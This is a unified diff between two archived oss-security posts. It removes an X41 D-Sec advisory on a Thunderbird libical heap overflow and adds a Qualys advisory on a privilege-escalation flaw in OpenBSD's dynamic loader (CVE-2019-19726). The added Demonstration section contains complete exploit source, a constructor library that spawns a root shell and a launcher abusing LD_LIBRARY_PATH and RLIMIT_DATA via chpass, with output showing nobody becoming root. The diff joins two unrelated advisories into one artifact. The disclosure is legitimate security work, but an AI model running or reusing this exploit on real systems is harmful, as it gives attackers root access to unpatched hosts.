@@ -1,113 +1,243 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/06/13/2
-Message-ID: <78341418-712f-7e10-5504-39596069f6ea@x41-dsec.de>
-Date: Thu, 13 Jun 2019 22:31:56 +0200
-From: X41 D-Sec GmbH Advisories <advisories@...-dsec.de>
-To: oss-security@...ts.openwall.com
-Subject: X41 D-Sec GmbH Security Advisory X41-2019-002: Heap-based buffer overflow in Thunderbird
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/11/9
+Message-ID: <20191211210637.GE26987@localhost.localdomain>
+Date: Wed, 11 Dec 2019 21:15:43 +0000
+From: Qualys Security Advisory <qsa@...lys.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
 
-X41 D-Sec GmbH Security Advisory: X41-2019-002
+Qualys Security Advisory
 
-Heap-based buffer overflow in Thunderbird
-=========================================
-Severity Rating: High
-Confirmed Affected Versions: All versions affected
-Confirmed Patched Versions: Thunderbird ESR 60.7.XXX
-Vendor: Thunderbird
-Vendor URL: https://www.thunderbird.net/
-Vendor Reference: https://bugzilla.mozilla.org/show_bug.cgi?id=1553820
-Vector: Incoming mail with calendar attachment
-Credit: X41 D-SEC GmbH, Luis Merino
-Status: Public
-CVE: CVE-2019-11703
-CWE: 122
-CVSS Score: 7.8
-CVSS Vector: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H/E:U/RL:O
-Advisory-URL:
-https://www.x41-dsec.de/lab/advisories/x41-2019-002-thunderbird
+Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)
 
-Summary and Impact
-==================
-A heap-based buffer overflow has been identified in the Thunderbird
-email client. The issue is present in the libical implementation, which
-was forked from upstream libical version 0.47.
-The issue can be triggered remotely, when an attacker sends an specially
-crafted calendar attachment and does not require user interaction. It
-might be used by a remote attacker to crash or gain remote code
-execution in the client system.
 
-This issue was initially reported by Brandon Perry here:
+==============================================================================
+Contents
+==============================================================================
 
-https://bugzilla.mozilla.org/show_bug.cgi?id=1281041
-
-and fixed in libical upstream, but was never fixed in Thunderbird.
-X41 did not perform a full test or audit on the software.
-
-Product Description
-===================
-Thunderbird is a free and open source email, newsfeed, chat, and
-calendaring client, that's easy to set up and customize.
-
+Summary
 Analysis
-========
-A heap-based buffer overflow in icalparser.c parser_get_next_char()
-can be triggered while parsing a calendar attachment containing a
-malformed or specially crafted string.
-The issue initially manifests with out of bounds read, but we don't
-discard it could later lead to out of bounds write.
-It is expected that an attacker can exploit this vulnerability to
-achieve remote code execution.
+Demonstration
+Acknowledgments
 
-Proof of Concept
-================
-A reproducer ical file can be found in
 
-https://github.com/x41sec/advisories/tree/master/X41-2019-002
+==============================================================================
+Summary
+==============================================================================
 
-Workarounds
-===========
-A fix is available from upstream. Alternatively, libical can be replaced
-by icaljs, a JavaScript implementation of ical parsing, by setting
-calendar.icaljs = true in Thunderbird configuration.
+We discovered a Local Privilege Escalation in OpenBSD's dynamic loader
+(ld.so): this vulnerability is exploitable in the default installation
+(via the set-user-ID executable chpass or passwd) and yields full root
+privileges.
 
-Timeline
-========
-2016-06-20 Issue reported by Brandon Perry to the vendor
-2019-05-23 Issues reported to the vendor
-2019-05-23 Vendor reply
-2019-06-12 CVE IDs assigned
-2019-06-13 Patched Version released
-2019-06-13 Advisory released
+We developed a simple proof of concept and successfully tested it
+against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both
+amd64 and i386; other releases and architectures are probably also
+exploitable.
 
-About X41 D-SEC GmbH
-====================
-X41 is an expert provider for application security services.
-Having extensive industry experience and expertise in the area of
-information security, a strong core security team of world class
-security experts enables X41 to perform premium security services.
-Fields of expertise in the area of application security are security
-centered code reviews, binary reverse engineering and vulnerability
-discovery.
 
-Custom research and a IT security consulting and support services are
-core competencies of X41.
------BEGIN PGP SIGNATURE-----
+==============================================================================
+Analysis
+==============================================================================
 
-iQIzBAEBCAAdFiEEpwxVTgxAIcUvTugIo5Klpg50CxAFAl0CsrwACgkQo5Klpg50
-CxA1XQ//ZCNmc7/gBSo7qcSnraQe7ry0pjVjWSrRajBoOYbf4bhDC+tMW0XOTYnb
-FKdND8qWMZKvTxeDGDIDJanREFotSfIX7UcKLZOzrSQO8hRCCizVJ1olF6vZBl7g
-q4wFU5T9w4EyHP7ihBMCC4PimYlh9S+ZQAoSv7if9ObDpqs6SSNEDbandGklxMYW
-g26N6AzTU0HSVX/fSVGYhhDFiP7dBCJE1ydkBJ7BITjhkU/NAfvL3IdASD5Tb6Sa
-oPYHdnHZJcPHsNw2ftCfSCfbDjN5HOd6AFQGcx/w9YdIEQz4f/Zsdm/gtX/B5vpW
-xGFt1gIfZqQuvQSj3iVcKDsTfE+4ikJFeBng80o6qviMye4txWHfFDRUIq8h7czW
-wZ+JU/2BgU+mD8qRMttsfvSK6HgBQTArMN3Sl6i/8V1sQ09nQu+tUDfv6ZfgfHZX
-sECDKnCPqIJIemG8q3hXNvaFdmAv2AFsS06RKFjy5Et7EsFv2ZAj7Zwh+NyINq6h
-6/UdVhrU7+lIOKDmG8vVTYFEAYrpwYVMB3BDTwJ+M6aIMZT0s2sJrc7PnfKrEAPt
-LGEu4B+sBqhR+FI21xO1O+DPi2NuotYi4xn9KOM894j9Oyahx6Cpr/fxt9ubkb4y
-4VveOoPcAKpcSKyDx32mm463TuXjtJfpKRGiNAMMxztuOtMoiso=
-=k4K9
------END PGP SIGNATURE-----
+In this section, we analyze a step-by-step execution of our proof of
+concept:
+
+------------------------------------------------------------------------------
+
+1/ We execve() the set-user-ID /usr/bin/chpass, but first:
+
+   1a/ we set the LD_LIBRARY_PATH environment variable to one single dot
+   (the current working directory) and approximately ARG_MAX colons (the
+   maximum number of bytes for the argument and environment list); as
+   described in man ld.so:
+
+     LD_LIBRARY_PATH
+             A colon separated list of directories, prepending the default
+             search path for shared libraries.  This variable is ignored for
+             set-user-ID and set-group-ID executables.
+
+   1b/ we set the RLIMIT_DATA resource limit to ARG_MAX * sizeof(char *)
+   (2MB on amd64, 1MB on i386); as described in man setrlimit:
+
+     RLIMIT_DATA     The maximum size (in bytes) of the data segment for a
+                     process; this includes memory allocated via malloc(3) and
+                     all other anonymous memory mapped via mmap(2).
+
+------------------------------------------------------------------------------
+
+2/ Before the main() function of chpass is executed, the _dl_boot()
+function of ld.so is executed and calls _dl_setup_env():
+
+262 void
+263 _dl_setup_env(const char *argv0, char **envp)
+264 {
+...
+271         _dl_libpath = _dl_split_path(_dl_getenv("LD_LIBRARY_PATH", envp));
+...
+283         _dl_trust = !_dl_issetugid();
+284         if (!_dl_trust) {       /* Zap paths if s[ug]id... */
+285                 if (_dl_libpath) {
+286                         _dl_free_path(_dl_libpath);
+287                         _dl_libpath = NULL;
+288                         _dl_unsetenv("LD_LIBRARY_PATH", envp);
+289                 }
+
+------------------------------------------------------------------------------
+
+3/ At line 271, _dl_getenv() returns a pointer to our LD_LIBRARY_PATH
+environment variable and passes it to _dl_split_path():
+
+ 23 char **
+ 24 _dl_split_path(const char *searchpath)
+ 25 {
+ ..
+ 35         pp = searchpath;
+ 36         while (*pp) {
+ 37                 if (*pp == ':' || *pp == ';')
+ 38                         count++;
+ 39                 pp++;
+ 40         }
+ ..
+ 45         retval = _dl_reallocarray(NULL, count, sizeof(*retval));
+ 46         if (retval == NULL)
+ 47                 return (NULL);
+
+------------------------------------------------------------------------------
+
+4/ At line 45, count is approximately ARG_MAX (the number of colons in
+our LD_LIBRARY_PATH) and _dl_reallocarray() returns NULL (because of our
+low RLIMIT_DATA); at line 47, _dl_split_path() returns NULL.
+
+------------------------------------------------------------------------------
+
+5/ As a result, _dl_libpath is NULL (line 271) and our LD_LIBRARY_PATH
+is ignored, but it is not deleted from the environment (CVE-2019-19726):
+although _dl_trust is false (_dl_issetugid() returns true because chpass
+is set-user-ID), _dl_unsetenv() is not called (line 288) because
+_dl_libpath is NULL (line 285).
+
+------------------------------------------------------------------------------
+
+6/ Next, the main() function of chpass is executed, and it:
+
+   6a/ calls setuid(0), which sets the real and effective user IDs to 0;
+
+   6b/ calls pw_init(), which resets RLIMIT_DATA to RLIM_INFINITY;
+
+   6c/ calls pw_mkdb(), which vfork()s and execv()s /usr/sbin/pwd_mkdb
+   (unlike execve(), execv() does not reset the environment).
+
+------------------------------------------------------------------------------
+
+7/ Before the main() function of pwd_mkdb is executed, the _dl_boot()
+function of ld.so is executed and calls _dl_setup_env():
+
+   7a/ at line 271, _dl_getenv() returns a pointer to our
+   LD_LIBRARY_PATH environment variable (because it was not deleted from
+   the environment in step 5, and because execv() did not reset the
+   environment in step 6c);
+
+   7b/ at line 45, _dl_reallocarray() does not return NULL anymore
+   (because our low RLIMIT_DATA was reset in step 6b);
+
+   7c/ as a result, _dl_libpath is not NULL (line 271), and it is not
+   reset to NULL (line 287) because _dl_trust is true (_dl_issetugid()
+   returns false because pwd_mkdb is not set-user-ID, and because the
+   real and effective user IDs were both set to 0 in step 6a): our
+   LD_LIBRARY_PATH is not ignored anymore.
+
+------------------------------------------------------------------------------
+
+8/ Finally, ld.so searches for shared libraries in _dl_libpath (our
+LD_LIBRARY_PATH) and loads our own library from the current working
+directory (the dot in our LD_LIBRARY_PATH).
+
+------------------------------------------------------------------------------
+
+
+==============================================================================
+Demonstration
+==============================================================================
+
+In this section, we demonstrate the use of our proof of concept:
+
+------------------------------------------------------------------------------
+
+$ id
+uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
+
+$ cd /tmp
+
+$ cat > lib.c << "EOF"
+#include <paths.h>
+#include <unistd.h>
+
+static void __attribute__ ((constructor)) _init (void) {
+    if (setuid(0) != 0) _exit(__LINE__);
+    if (setgid(0) != 0) _exit(__LINE__);
+    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
+    execve(argv[0], argv, NULL);
+    _exit(__LINE__);
+}
+EOF
+
+$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
+ 0x0000000000000001 (NEEDED)             Shared library: [libutil.so.13.1]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.95.1]
+
+$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c
+
+$ cat > poc.c << "EOF"
+#include <string.h>
+#include <sys/param.h>
+#include <sys/resource.h>
+#include <unistd.h>
+
+int
+main(int argc, char * const * argv)
+{
+    #define LLP "LD_LIBRARY_PATH=."
+    static char llp[ARG_MAX - 128];
+    memset(llp, ':', sizeof(llp)-1);
+    memcpy(llp, LLP, sizeof(LLP)-1);
+    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };
+
+    #define DATA (ARG_MAX * sizeof(char *))
+    const struct rlimit data = { DATA, DATA };
+    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);
+
+    if (argc <= 1) _exit(__LINE__);
+    argv += 1;
+    execve(argv[0], argv, envp);
+    _exit(__LINE__);
+}
+EOF
+
+$ gcc -s -o poc poc.c
+
+$ ./poc /usr/bin/chpass
+
+# id
+uid=0(root) gid=0(wheel) groups=32767(nobody)
+
+------------------------------------------------------------------------------
+
+
+==============================================================================
+Acknowledgments
+==============================================================================
+
+We thank Theo de Raadt and the OpenBSD developers for their incredibly
+quick response: they published a patch for this vulnerability in less
+than 3 hours. We also thank MITRE's CVE Assignment Team.
+
+
+
+[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
+
+
+
+This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
